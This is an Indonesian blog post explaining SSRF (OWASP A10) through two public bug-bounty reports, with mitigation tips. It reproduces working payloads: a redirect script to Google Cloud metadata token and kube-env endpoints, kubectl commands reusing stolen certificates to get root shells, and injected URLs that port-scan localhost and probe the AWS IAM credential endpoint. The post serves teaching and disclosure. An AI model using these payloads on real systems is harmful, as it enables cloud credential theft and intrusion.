---
title: "Owasp Top 10 Series — A10 (Server Side Request Forgery | SSRF)"
date: 2022-05-20T12:45:34+07:00
tags: ["security"]
categories: ["Owasp Top Ten"]
thumbnail: "/icon/owasp.svg"
---

## Pengantar

Artikel kali ini kita akan membahas owasp top 10 yang ada di urutan terakhir untuk tahun 2021 (owasp tiap 4 tahun sekali), ialah **Server Side Request Forgery (SSRF)**.

OWASP merupakan singkatan dari _Open Web Application Security Project_, yang merupakan sebuah project _Security Web Application_ open source yang diperkasai oleh para penggiat teknologi atau pengembang aplikasi, OWASP sering mengadakan seminar, forum diskusi serta pendidikan untuk para Developer.

jadi yang dimaksud **OWASP TOP 10**? owasp top 10 merupakan sebuah cara untuk mengkategorikan resiko kerentanan yang sering terjadi pada sebuah aplikasi berbasis website, dari yang paling atas (resiko tertinggi) hingga yang paling bawah (tingkat resiko rendah), Tujuannya apa ?, tentu saja ini sangat berguna bagi para developer aplikasi supaya mereka jadi lebih aware terhadap kerentanan di aplikasi mereka.

## Server Side Request Forgery (SSRF)

### Apa itu Server Side Request Forgery (SSRF) ?

**Server Side Request Forgery (SSRF)** merupakan sebuah kerentanan yang disebabkan di layer (aplication dan network) yan dimana _request_ dari user diizinkan untuk melakukan interaksi dengan **internal network** yang menyebabkan **permintaan URL** dari user akan _dianggap_ sebagai permintaan dari _internal network_ oleh aplikasi/website (Tidak adan validasi).

## Praktikal

### #341876 SSRF in Exchange leads to ROOT access in all instances

Sumber : https://hackerone.com/reports/341876

#### Access Google Cloud Metadata

attacker membuat toko (patners.shopify.com)
edit template [password.liquid] dan menambahkan konten :

```
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";
  // iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.
    </script>
```

attacker pergi ke *https://exchange.shopify.com/create-a-listing* lalu menginstall **Exchange app** - > **Create Listing page**
Download gambar .PNG dan buka

attacker coba untuk mendapatkan lebih banyak sensitif data

```
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";
</script>
```

Can I add my SSH key using the leaked token? No

```
curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Content-Type: application/json" --data '{"items": [{"key": "0xACB", "value": "test"}]}'
```

```
{
 "error": {
  "errors": [
   {
    "domain": "global",
    "reason": "forbidden",
    "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/███████'"
   },
   {
    "domain": "global",
    "reason": "forbidden",
    "message": "Required 'iam.serviceAccounts.actAs' permission for 'projects/███████'"
   }
  ],
  "code": 403,
  "message": "Required 'compute.projects.setCommonInstanceMetadata' permission for 'projects/████████'"
 }
}
```

attacker mengecek token dan mendapati bahwa token tidak mengeizinkan **read/write**

```
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=██████████████████"
```

```
{
 "issued_to": "███████",
 "audience": "███",
 "scope": "https://www.googleapis.com/auth/cloud-platform",
 "expires_in": 1307,
 "access_type": "offline"
}
```

#### Dumping kube-env

attacker membuat toko baru dan _pull_

http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json

Metadata concealment

https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment

attacker kemudian membuat request baru :

http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json

**CA.CRT**

```
-----BEGIN CERTIFICATE-----
██████
███████
███████
████████
██████████████
████████
████████
███████
████
██████
███
█████████
████
████
████████
███████
███
-----END CERTIFICATE-----
```

**CLIENT.CRT**

```
-----BEGIN CERTIFICATE-----
█████
███████
██████
████████
██████████
█████
██████
█████
█████
██████████
███████
█████
████
████
████████
████████
-----END CERTIFICATE-----
```

**CLIENT.PEM**

```
-----BEGIN RSA PRIVATE KEY-----
█████████
██████
████████
████
████
█████████
██████████
██████
████████
█████████
██████
██████████
███
██████████
███
██████
█████████
████████
██████████
█████████
████
████
████████
████
███████
-----END RSA PRIVATE KEY-----
```

#### Mengunakan Kubelet untuk _arbitary commands_

```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces

NAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE
████████                    ██████████                    1/1
```

```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml

pod "shell-demo" created
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo

pod "shell-demo" deleted
```

```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash

Error from server (Forbidden): pods "shell-demo" is forbidden: User "███" cannot create pods/exec in the namespace "default": Unknown user "███"
```

```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://███ describe pods/█████ -n █████████

Name:           ████████
Namespace:      ██████
Node:           ██████████
Start Time:     Fri, 23 Mar 2018 13:53:13 +0000
Labels:         █████
                ████
                █████
Annotations:    <none>
Status:         Running
IP:             █████████
Controlled By:  █████
Containers:
  default-http-backend:
    Container ID:   docker://███
    Image:          ██████
    Image ID:       docker-pullable://█████
    Port:           ████/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Sun, 22 Apr 2018 03:23:09 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    2
      Started:      Fri, 20 Apr 2018 23:39:21 +0000
      Finished:     Sun, 22 Apr 2018 03:23:07 +0000
    Ready:          True
    Restart Count:  180
    Limits:
      cpu:     10m
      memory:  20Mi
    Requests:
      cpu:        10m
      memory:     20Mi
    Liveness:     http-get http://:███/healthz delay=30s timeout=5s period=10s #success=1 #failure=3
    Environment:  <none>
    Mounts:
      ██████
Conditions:
  Type           Status
  Initialized    True
  Ready          True
  PodScheduled   True
Volumes:
 ██████████:
    Type:        Secret (a volume populated by a Secret)
    SecretName: ███████
    Optional:    false
QoS Class:       Guaranteed
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute for 300s
                 node.kubernetes.io/unreachable:NoExecute for 300s
Events:          <none>

```

attacker dapat mengunakan token untuk mendapatkan akses ke semua container

```
$ kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash

Defaulting container name to web.
Use 'kubectl describe pod/w█████████' to see all of the containers in this pod.
███████:/# id
uid=0(root) gid=0(root) groups=0(root)
█████:/# ls
app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
███████:/# exit
```

```
$ kubectl --certificate-authority ca.crt --server https://███████ --token "█████.██████.█████████" exec -it ████████ -n ████████ -- /bin/bash

Defaulting container name to web.
Use 'kubectl describe pod/█████ -n █████' to see all of the containers in this pod.
root@████:/# id
uid=0(root) gid=0(root) groups=0(root)
root@████:/# ls
app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
root@█████:/# exit
```

Impact :

RCE

### #514224 SSRF in Search.gov via ?url= parameter

sumber : https://hackerone.com/reports/514224

Login ke _Search.gov_ dan klik _help manual_.

Request :

```
GET /help_docs?url=https%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
Host: search.usa.gov
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://search.usa.gov/account
X-NewRelic-ID: VgYAV1BRCxABU1JUBAUCXlI=
X-CSRF-Token: /2jDOc6aYEZA5VealIrF44qJZtY0iDiTsALu8HYA+OOIewuKHREwyh6M0wGa2WC9amTPX4vPMjj0YQIjys3nNA==
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: _ga=GA1.2.924676610.1553290937; _gid=GA1.2.1047460386.1553290937; _ga=GA1.3.924676610.1553290937; _gid=GA1.3.1047460386.1553290937; _session_id=a0d5ecbfa9404ea9ffad4cb3ea771dea; user_credentials=1055608db95b714d9ae2ef05a4e1b83aa138ad5fca67422f02ca795ec2a74179bb15c610dd33f5e6f200be0de0e812a8fe3d59a0027b290b5377ab2a65da1f19%3A%3A5992
```

Jika menambahkan *http://127.0.0.1:21/?%0A* sebelum url parameter dan send request, didapati respon seperti berikut (450ms. (Port is closed))

Request :

```
GET /help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
(snip)

```

Response :

```
HTTP/1.1 200 OK
(snip)
{"body":"<div class='alert alert-error'>Unable to retrieve <a href='http://127.0.0.1:21/?\nhttps://search.gov/manual/account.html'>http://127.0.0.1:21/?\nhttps://search.gov/manual/account.html</a>.</div>"}

```

Kalau menambahkan *http://127.0.0.1:22/?%0A* sebelum url parameter dan send request, respon seperti berikut (10,468ms. (Port is open))

Request :

```
GET /help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
(snip)
```

Response :

```
HTTP/1.1 200 OK
(snip)
{"body":"<div class='alert alert-error'>Unable to retrieve <a href='http://127.0.0.1:22/?\nhttps://search.gov/manual/account.html'>http://127.0.0.1:22/?\nhttps://search.gov/manual/account.html</a>.</div>"}
```

tambahkan *http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0A*

Requests :

```
GET /help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
(snip)
```

Response :

```
HTTP/1.1 200 OK
(snip)
{"body":""}
```

tambahkan *http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0A* maka _Unable to retrieve_ ** (/security-credentialx does not exists)**

Request :

```
GET /help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
(snip)
```

Response :

```
HTTP/1.1 200 OK
(snip)
{"body":"<div class='alert alert-error'>Unable to retrieve <a href='http://169.254.169.254/latest/meta-data/iam/security-credentialx/?\nhttps://search.gov/manual/account.html'>http://169.254.169.254/latest/meta-data/iam/security-credentialx/?\nhttps://search.gov/manual/account.html</a>.</div>"}

```

## Mitigasi

- Network Layer
  - Block semua externall traffic dengan firewall
  - _Record_ semua network yang mengaksess aplikasi tanpa melewati firewall
- Application Layer
  - Lakukan Validasi semua inputan dari client
  - disable HTTP Redirects
  - jangan mengirimkan respon ke client secara **Raw**

## Referensi

[OWASP - Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

[PortSwigger - Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)

[Acunetix - What is Server-Side Request Forgery (SSRF)?](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)

[SSRF bible](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)

[A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

## Beberapa Kerentanan lain di list CWE

[CWE-918 Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
